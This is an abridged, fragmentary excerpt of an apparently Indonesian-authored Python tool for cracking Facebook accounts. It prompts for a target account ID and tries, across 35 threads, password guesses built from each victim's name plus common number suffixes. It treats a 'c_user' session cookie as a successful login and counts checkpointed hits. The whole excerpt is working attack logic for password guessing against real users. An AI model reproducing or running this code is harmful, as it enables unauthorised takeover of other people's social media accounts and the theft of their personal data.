...
\33[mTELEGRAM:@SAW404x"""%(BM))
	...
	[0] Logout
		...
		if chose=='1' or chose=='2':
			...
			account_target = input(" ID FACBOOK DANE : ")
			try:
	...
	def crack(self, user, password_list, url):
		...
		for pw in password_list:
			...
			if "c_user" in session.cookies.get_dict():
				...
				opsi.clear()
				break
			sys.stdout.write("\r\033[1;97m[SAW] %s/%s\033[1;92m OK | \033[1;91m CP:%s/%s"%(len(loop),len(data_id),len(ok),len(cp)))
			sys.stdout.flush()
		loop.append("memek")
		...
		with ThreadPoolExecutor(max_workers=35) as kirim:
			for x in self.data_id:
				...
				if(len(name[0])>=6):
					...
					__password_list = [namee,name[0]+'1234@',name[0]+'1234#',name[0]+'12345@',name[0]+'12345#',name[0]+'123456@',name[0]+'123456#',name[0]+'369',name[0]+'964',name[0]+'248',name[0]+'1221',name[0]+'4444',name[0]+'1980',name[0]+'1212',name[0]+'12123434',name[0]+'4321',name[0]+'87654',name[0]+'2121',name[0]+'3232',name[0]+'4343',name[0]+'5454',name[0]+'6565',name[0]+'7676',name[0]+'8787',name[0]+'2012',name[0]+'2013',name[0]+'1212@',name[0]+'2468',name[0]+'2009',name[0]+'2010',name[0]+'2011']
				else:
					__password_list = [namee,name[0]+'112233445566',name[0]+'1111',name[0]+'112233445566',name[0]+'100200',name[0]+'100200300400',name[0]+'100200300',name[0]+'300200100',name[0]+'100400',name[0]+'1980',name[0]+'1981',name[0]+'1982',name[0]+'1983',name[0]+'1984',name[0]+'1985',name[0]+'1986',name[0]+'1987',name[0]+'1988',name[0]+'1989',name[0]+'0751',name[0]+'0752',name[0]+'0753',name[0]+'0754',name[0]+'0780',name[0]+'0781',name[0]+'0782',name[0]+'0783',name[0]+'0784',name[0]+'0770',name[0]+'0771',name[0]+'0772']
				if add=="y":
